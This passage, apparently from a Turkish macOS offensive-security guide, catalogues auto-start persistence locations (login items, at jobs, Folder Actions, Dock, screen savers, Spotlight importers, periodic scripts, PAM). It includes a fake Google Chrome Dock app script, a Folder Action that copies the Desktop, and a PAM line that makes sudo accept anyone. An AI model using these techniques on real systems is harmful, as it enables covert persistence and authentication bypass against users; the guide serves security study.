Bunları command line üzerinden listelemek, eklemek ve kaldırmak mümkündür:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Login items**, yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklayan [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu bölüm onun bir uzantısıdır)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** bu dosyayı açar. ZIP dosyası örneğin **`~/Library`** içinde saklanmışsa ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist dosyası eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist dosyasında belirtilen **backdoor çalıştırılır**.

Diğer bir seçenek, kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır

#### **Açıklama**

`at` görevleri, belirli zamanlarda yürütülecek **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron job'larının aksine, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarından sonra da kalıcı olduğunu ve belirli koşullar altında potansiyel güvenlik sorunları oluşturabileceğini belirtmek önemlidir.<sup>[[16]](#references)</sup>

**Varsayılan olarak** **devre dışıdır**, ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` kullanarak iş kuyruğunu kontrol edin.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda zamanlanmış iki iş görebiliriz. İşin ayrıntılarını `at -c JOBNUMBER` kullanarak yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks etkin değilse oluşturulan tasks çalıştırılmaz.

**job files** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı queue bilgisini, job numarasını ve çalışmasının planlandığı zamanı içerir. Örneğin `a0001a019bdcd2` değerine bakalım.

- `a` - queue bilgisidir
- `0001a` - hex cinsinden job numarasıdır, `0x1a = 26`
- `019bdcd2` - hex cinsinden zamandır. Epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal olarak `26991826` değerine eşittir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarihine karşılık gelir.

Job dosyasını yazdırırsak `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox'u bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions'ı yapılandırabilmek için **`System Events`** ile iletişim kuracak şekilde `osascript`'i argümanlarla çağırabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
- Root gereklidir
- **Tetikleyici**: Belirtilen folder'a erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Tetikleyici**: Belirtilen folder'a erişim

#### Açıklama ve Exploitation

Folder Actions; öğelerin eklenmesi, kaldırılması veya folder window'un açılması ya da yeniden boyutlandırılması gibi bir folder'daki değişikliklerle otomatik olarak tetiklenen script'lerdir. Bu action'lar çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions'ı ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow'u hazırlayıp bunu service olarak yüklemek.
2. Bir folder'ın context menu'sündeki Folder Actions Setup üzerinden manuel olarak bir script eklemek.
3. Programatik olarak bir Folder Action ayarlamak için OSAScript kullanarak `System Events.app`'e Apple Event mesajları göndermek.
- Bu method, action'ı system'e yerleştirmek ve bir persistence seviyesi sağlamak için özellikle kullanışlıdır.

Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki betiği Folder Actions tarafından kullanılabilir hale getirmek için şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra, aşağıdaki script'i çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı genel olarak etkinleştirir ve daha önce derlenen script'i özellikle Desktop klasörüne bağlar.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum script'ini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu, persistence'ı GUI üzerinden uygulamanın yoludur:

Çalıştırılacak script şudur:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuza göre **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklandı.

Şimdi bu persistence işlemini GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız olduğuna göre

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı kullanması için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu işlem bende çalışmadı, ancak bunlar writeup'taki talimatlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox'u bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak sistemin içine malicious bir application yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Tetikleyici**: Kullanıcı Dock içindeki application'a tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm application'lar plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Şu komutla yalnızca bir **application eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bir miktar **social engineering** kullanarak dock içinde örneğin Google Chrome'u **impersonate** edebilir ve kendi script'inizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok spesifik bir eylemin gerçekleşmesi gerekir
- Başka bir sandbox içinde olacaksınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekir
- Tetikleyici: Renk seçiciyi kullanma
- `~/Library/ColorPickers`
- Tetikleyici: Renk seçiciyi kullanma

#### Açıklama ve Exploit

Kodunuzu içeren bir **color picker** bundle'ı derleyin (örneğin [**bunu kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)) ve bir constructor ekleyin ([Screen Saver bölümünde](macos-auto-start-locations.md#screen-saver) olduğu gibi), ardından bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.<sup>[[20]](#references)</sup>

Ardından, color picker tetiklendiğinde sizin kodunuz da çalıştırılmalıdır.

Library'nizi yükleyen binary'nin **son derece kısıtlayıcı bir sandbox** kullandığını unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

`Finder Sync Extension` içeren bir uygulama [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple developer certificate ile imzalanmış** olması, **sandboxed** olması (ancak daha esnek istisnalar eklenebilir) ve aşağıdakine benzer bir şeyle kaydedilmiş olması gerekir:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak sonunda yaygın bir application sandbox'ında olacaksınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Screen Saver'ı seçin
- `/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Screen Saver'ı seçin
- `~/Library/Screen Savers`
- **Tetikleyici**: Screen Saver'ı seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu buna ekleyin; örneğin aşağıdaki kod loglar oluşturur.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** alın ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterlidir; çok sayıda log oluşturmalıdır:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunduğundan, **common application sandbox** içinde olacağınızı unutmayın.

Saver kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugin'leri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak bir application sandbox içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Yeni bir app gerekli

#### Açıklama ve Exploitation

Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama özelliğini desteklemek için Spotlight, **özel bir database** tutar ve **çoğu dosyayı parse ederek** bir index oluşturur; böylece hem dosya adları hem de içerikleri arasında hızlı arama yapılabilir.<sup>[[25]](#references)</sup>

Spotlight'ın temel mekanizması, adını **'metadata server'** ifadesinden alan 'mds' adlı merkezi bir process'i içerir. Bu process, Spotlight service'in tamamını yönetir. Buna ek olarak, farklı dosya türlerini index'lemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'u bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya Spotlight'ın çok çeşitli dosya formatlarındaki içerikleri anlamasını ve index'lemesini sağlayan **".mdimporter bundle'ları** aracılığıyla gerçekleştirilir.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında bir dakika içinde yüklenir (herhangi bir service'i yeniden başlatmaya gerek yoktur). Bu bundle'lar, **hangi dosya türlerini ve uzantılarını yönetebileceklerini** belirtmelidir; böylece Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Yüklü tüm `mdimporter`'ları şu komutla bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter` dosyalarının Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
>
> Ayrıca, System varsayılan plugin'leri her zaman önceliklidir; bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde indexlenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ardından adı, **`CFBundleDocumentTypes`** değerini değiştirin ve desteklemek istediğiniz uzantıyı desteklemesi için **`UTImportedTypeDeclarations`** ekleyip bunları **`schema.xml`** dosyasına yansıtın.\
Sonra **`GetMetadataForFile`** fonksiyonunun kodunu, işlenen uzantıya sahip bir dosya oluşturulduğunda payload'unuzu çalıştıracak şekilde **değiştirin**.

Son olarak, yeni `.mdimporter` dosyanızı **build edip önceki üç konumdan** birine kopyalayın. Yüklenip yüklenmediğini **log'ları izleyerek** veya **`mdimport -L`** çalıştırarak kontrol edebilirsiniz.

### ~~Preference Pane~~

> [!CAUTION]
> Bunun artık çalışıyor gibi görünmediğini belirtelim.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir kullanıcı eylemi gerektirir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Açıklama

Bunun artık çalışıyor gibi görünmediğini belirtelim.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> Burada, **root** olarak bir dosyaya **yazarak** bir şeyi basitçe çalıştırmanıza olanak sağlayan **sandbox bypass** için yararlı başlangıç konumlarını ve/veya başka **garip koşullar** gerektiren konumları bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gerekir
- **Tetikleyici**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gerekir
- **Tetikleyici**: Zamanı geldiğinde

#### Açıklama ve Exploitation

Periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` içinde yapılandırılmış **launch daemon**'ları nedeniyle çalıştırılır. `/etc/periodic/` içinde saklanan script'lerin **dosya sahibinin** yetkileriyle **çalıştırıldığını** unutmayın; bu nedenle bu yöntem olası bir privilege escalation için işe yaramaz.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** içinde çalıştırılacak diğer periodic scriptler belirtilmiştir:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Bir şekilde `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, **er ya da geç çalıştırılır**.

> [!WARNING]
> Periodic script'in **script'in sahibi olarak çalıştırılacağını** unutmayın. Yani script'in sahibi normal bir kullanıcıysa, script o kullanıcı olarak çalıştırılır (bu, privilege escalation saldırılarını engelleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Her zaman root gerekir

#### Description & Exploitation

PAM, macOS içinde kolay execution'dan ziyade **persistence** ve malware konularına daha fazla odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.<sup>[[28]](#references)</sup>

PAM modüllerini şu komutla kontrol edin:
```bash
ls -l /etc/pam.d
```
PAM'i abuse eden bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirerek başına şu satırı eklemek kadar kolaydır:
```bash
auth       sufficient     pam_permit.so
```
Yani şöyle bir şeye **benzeyecek**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimleri işe yarayacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu unutmayın; bu nedenle kullanıcının erişim isteyen bir istem alması oldukça olasıdır.

Bir başka güzel örnek de su'dur; burada PAM modules'a parametre vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da ekleyebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugin'leri

